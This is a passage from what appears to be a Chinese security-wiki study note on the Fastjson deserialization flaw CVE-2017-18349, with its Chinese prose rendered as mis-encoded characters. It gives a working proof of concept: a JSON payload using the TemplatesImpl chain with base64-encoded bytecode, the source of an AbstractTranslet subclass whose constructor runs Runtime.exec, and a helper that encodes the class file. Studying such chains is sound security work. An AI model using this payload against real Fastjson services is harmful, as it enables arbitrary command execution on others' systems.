            <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">String</span> strVal <span class="token operator">=</span> lexer<span class="token punctuation">.</span><span class="token function">stringVal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                lexer<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> strVal<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">ObjectDeserializer</span> derializer <span class="token operator">=</span> config<span class="token punctuation">.</span><span class="token function">getDeserializer</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> derializer<span class="token punctuation">.</span><span class="token function">deserialze</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> type<span class="token punctuation">,</span> fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JSONException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> e<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>ã€å°ç»“ã€‘</strong></p><ul><li>è‹¥ååºåˆ—åŒ–æŒ‡å®šç±»å‹çš„ç±»å¦‚ <code>Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</code>â€‹ï¼Œè¯¥ç±»æœ¬èº«çš„æ„é€ å‡½æ•°ã€setter æ–¹æ³•ã€getter æ–¹æ³•å­˜åœ¨å±é™©æ“ä½œï¼Œåˆ™å­˜åœ¨ Fastjson ååºåˆ—åŒ–æ¼æ´</li><li>è‹¥ååºåˆ—åŒ–æœªæŒ‡å®šç±»å‹çš„ç±»å¦‚ <code>Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</code>â€‹ï¼Œè¯¥è‹¥è¯¥ç±»çš„å­ç±»çš„æ„é€ æ–¹æ³•ã€setter æ–¹æ³•ã€getter æ–¹æ³•å­˜åœ¨å±é™©æ“ä½œï¼Œåˆ™å­˜åœ¨ Fastjson ååºåˆ—åŒ–æ¼æ´</li></ul><p>â€</p><h2 id="cve-2017-18349-fastjson-1-2-24" tabindex="-1"><a class="header-anchor" href="#cve-2017-18349-fastjson-1-2-24"><span>CVE-2017-18349ï¼ˆfastjson &lt;= 1.2.24ï¼‰</span></a></h2><p>â€‹<code>fastjson &lt;= 1.2.24</code>â€‹ ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-18349ï¼‰ï¼Œå­¦ä¹  TemplatesImpl é“¾çš„ç›¸å…³çŸ¥è¯†ã€‚</p><p>å¯¹äº Fastjson 1.2.22-1.2.24 ç‰ˆæœ¬çš„ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ï¼Œç›®å‰å·²çŸ¥çš„ä¸»è¦æœ‰ä»¥ä¸‹çš„åˆ©ç”¨é“¾ï¼š</p><ul><li>åŸºäº TemplateImplï¼›</li><li>åŸºäº JNDIï¼ˆåˆåˆ†ä¸ºåŸºäº Bean Property ç±»å‹å’Œ Field ç±»å‹ï¼‰ï¼›</li></ul><h3 id="demo" tabindex="-1"><a class="header-anchor" href="#demo"><span>Demo</span></a></h3><ol><li>é¦–å…ˆåˆ›å»ºä¸€ä¸ª maven é¡¹ç›®ã€å¯¼å…¥ Fastjson1.2.23</li></ol><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.23<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>demo code</li></ol><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ParserConfig</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ParserConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> text <span class="token operator">=</span> <span class="token string">&quot;{\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:{ },\&quot;_outputProperties\&quot;:{ }}&quot;</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> config<span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240412175147-4b66dkt.91055659.png" alt="image" loading="lazy">â€‹</p><h3 id="evilclass" tabindex="-1"><a class="header-anchor" href="#evilclass"><span>EvilClass</span></a></h3><p>ä¸Šé¢çš„ <code>_bytecodes</code>â€‹ çš„å†…å®¹æ˜¯ä»¥ä¸‹å†…å®¹ç¼–è¯‘æˆå­—èŠ‚ç æ–‡ä»¶åï¼ˆ<code>.class</code>â€‹ï¼‰å† <code>base64</code>â€‹ ç¼–ç åçš„ç»“æœã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">poc</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test1</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>
    <span class="token comment">//æ„é€ å‡½æ•°</span>
    <span class="token keyword">public</span> <span class="token class-name">Test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span>SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">Test1</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬é€šè¿‡ä»¥ä¸Šä»£ç ç›´æ¥å®šä¹‰ç±» Test1ï¼Œå¹¶åœ¨ç±»çš„æ„é€ æ–¹æ³•ä¸­æ‰§è¡Œ calc çš„å‘½ä»¤ï¼›è‡³äºä¸ºä»€ä¹ˆè¦å†™ä¸Šè¿°ä»£ç çš„ transformï¼Œå› ä¸º Test ç±»æ˜¯ç»§æ‰¿ <code>AbstractTranslet</code>â€‹ çš„ï¼Œ<strong>ä¸Šè¿°ä»£ç çš„ä¸¤ä¸ª transform æ–¹æ³•éƒ½æ˜¯å®ç° AbstractTranslet æ¥å£çš„æŠ½è±¡æ–¹æ³•ï¼Œå› æ­¤éƒ½æ˜¯éœ€è¦çš„ã€‚</strong></p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240413104608-jk636eb.2d6dd914.png" alt="image" loading="lazy">â€‹</p><p>å…·ä½“æ¥è¯´çš„è¯ï¼Œç¬¬ä¸€ä¸ª transform ä¸»è¦çš„ <code>transform()</code>â€‹ æ–¹æ³• -- å®ƒè¢«ç¼–è¯‘å™¨è¦†ç›–ï¼Œç¬¬äºŒä¸ª transform ä½¿ç”¨ç»™å®šçš„è¾“å‡ºå¤„ç†ç¨‹åºè°ƒç”¨ <code>transform()</code>â€‹</p><p><strong>æ€»ç»“ï¼š</strong> å¯¹äºä¸Šè¿°ä»£ç ï¼Œåº”è¯¥è¿™ä¹ˆç†è§£ï¼šå»ºç«‹ Test1 ç±»ï¼Œå¹¶è®©å…¶ç»§æ‰¿ AbstractTranslet ç±»ã€‚ç„¶åé€šè¿‡ <code>Test1 t = new Test1()</code>â€‹; æ¥åˆå§‹åŒ–ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­ä¼šè§¦å‘æ„é€ æ–¹æ³•ï¼Œè€Œæˆ‘åœ¨æ„é€ æ–¹æ³•ä¸­çš„ä»£ç å°±æ˜¯æ‰§è¡Œ calcï¼Œæ‰€ä»¥ä¼šå¼¹å‡ºè®¡ç®—å™¨ã€‚</p><h3 id="classtobase64" tabindex="-1"><a class="header-anchor" href="#classtobase64"><span>ClassToBase64</span></a></h3><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆ IDEA ç¼–è¯‘å‡ºæ¥çš„å¯ä»¥è¿è¡Œï¼Œä½†æ˜¯å‘½ä»¤è¡Œä¼šæç¤ºï¼Œé”™è¯¯: æ‰¾ä¸åˆ°æˆ–æ— æ³•åŠ è½½ä¸»ç±» util.ClassToBase64 ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240413114422-jq015va.ad5a57a2.png" alt="image" loading="lazy">â€‹</p><p>å•ç‹¬å†™ä¸ªæ–‡ä»¶ç¼–è¯‘è¿è¡Œã€‚</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>* ç¼–è¯‘ï¼šjavac <span class="token parameter variable">-encoding</span> UTF-8 <span class="token parameter variable">-d</span> <span class="token builtin class-name">.</span> .<span class="token punctuation">\</span>ClassToBase64.java
* è¿è¡Œï¼šjava ClassToBase64
* Usage: <span class="token function">java</span> ClassToBase64 <span class="token operator">&lt;</span>classFilePath<span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassToBase64</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// java ClassToBase64 /path/to/your/MyClass.class</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Usage: java ClassToBase64 &lt;classFilePath&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token class-name">String</span> classFilePath <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token comment">// è¯»å–æŒ‡å®šè·¯å¾„ä¸‹çš„å­—èŠ‚ç æ–‡ä»¶</span>
            <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>classFilePath<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> fis<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            fis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
            fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// å°†å­—èŠ‚ç æ–‡ä»¶è½¬æ¢ä¸º Base64 ç¼–ç çš„å­—ç¬¦ä¸²</span>
            <span class="token class-name">String</span> base64Encoded <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// æ‰“å° Base64 ç¼–ç ç»“æœ</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>base64Encoded<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240413115324-dgtp6k2.50bfc5ad.png" alt="image" loading="lazy">â€‹</p><p>å¥½äº†è§£å†³äº†ï¼Œå°±æ˜¯è·¯å¾„ä¸å¯¹ã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token constant">PS</span> <span class="token class-name">D</span><span class="token operator">:</span>\tmp\fatjsondemo\target\classes\util<span class="token operator">&gt;</span> java <span class="token class-name">ClassToBase64</span>
é”™è¯¯<span class="token operator">:</span> æ‰¾ä¸åˆ°æˆ–æ— æ³•åŠ è½½ä¸»ç±» <span class="token class-name">ClassToBase64</span>

<span class="token comment">// -cp æ–¹å¼åœ¨ä»»ä½•è·¯å¾„éƒ½èƒ½æˆåŠŸæ‰§è¡Œ</span>
<span class="token constant">PS</span> <span class="token class-name">D</span><span class="token operator">:</span>\tmp<span class="token operator">&gt;</span> java <span class="token operator">-</span>cp <span class="token string">&quot;D:\tmp\fatjsondemo\target\classes&quot;</span> <span class="token class-name"><span class="token namespace">util<span class="token punctuation">.</span></span>ClassToBase64</span> <span class="token string">&quot;D:\tmp\fatjsondemo\target\classes\poc\Test1.class&quot;</span>

<span class="token comment">// classes ç›®å½•ä¸‹ï¼Œå¸¦åŒ…åæˆåŠŸæ‰§è¡Œ</span>
<span class="token constant">PS</span> <span class="token class-name">D</span><span class="token operator">:</span>\tmp\fatjsondemo\target\classes<span class="token operator">&gt;</span> java <span class="token class-name"><span class="token namespace">util<span class="token punctuation">.</span></span>ClassToBase64</span> <span class="token string">&quot;D:\tmp\fatjsondemo\target\classes\poc\Test1.class&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>ã€ç›®å½•ç»“æ„ã€‘</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token constant">PS</span> <span class="token class-name">D</span><span class="token operator">:</span>\tmp\fatjsondemo<span class="token operator">&gt;</span> tree <span class="token operator">/</span>f

<span class="token constant">PS</span> <span class="token class-name">D</span><span class="token operator">:</span>\tmp\fatjsondemo<span class="token operator">&gt;</span> tree
å· <span class="token class-name">Data</span> çš„æ–‡ä»¶å¤¹ <span class="token constant">PATH</span> åˆ—è¡¨
å·åºåˆ—å·ä¸º <span class="token constant">DA1D</span><span class="token operator">-</span><span class="token number">0E68</span>
<span class="token class-name">D</span><span class="token operator">:</span><span class="token punctuation">.</span>
â”œâ”€<span class="token punctuation">.</span>idea
â”œâ”€src
â”‚  â””â”€main
â”‚      â”œâ”€java
â”‚      â”‚  â”œâ”€demo
â”‚      â”‚  â”œâ”€poc
â”‚      â”‚  â””â”€util
â”‚      â”œâ”€resources
â”‚      â””â”€webapp
â”‚          â””â”€<span class="token constant">WEB</span><span class="token operator">-</span><span class="token constant">INF</span>
â””â”€target
    â”œâ”€classes
    â”‚  â”œâ”€demo
    â”‚  â”œâ”€poc
    â”‚  â””â”€util
